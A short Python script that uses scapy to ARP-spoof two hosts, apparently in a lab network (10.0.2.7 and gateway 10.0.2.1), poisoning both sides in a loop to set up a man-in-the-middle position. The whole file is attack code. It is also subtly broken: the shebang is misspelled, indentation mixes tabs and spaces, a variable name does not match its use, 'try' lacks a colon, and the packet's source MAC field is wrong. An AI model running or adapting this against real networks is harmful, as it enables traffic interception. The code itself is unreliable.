#!/usr/bin/enc python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_broadcast_request = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2 , pdst=target_ip, hwsrc = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)
    
  
# Count the send packets without filling the command prompt
sent_packets = 0 
try 
    while True:
        spoof("10.0.2.7" , "10.0.2.1")
        spoof("10.0.2.1" , "10.0.2.7")
        sent_packets = sent_packets + 2
        print("\rPackets sent" + str(sent_packets), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
        print("Pressed Ctrl + C ... quitting") 
            
        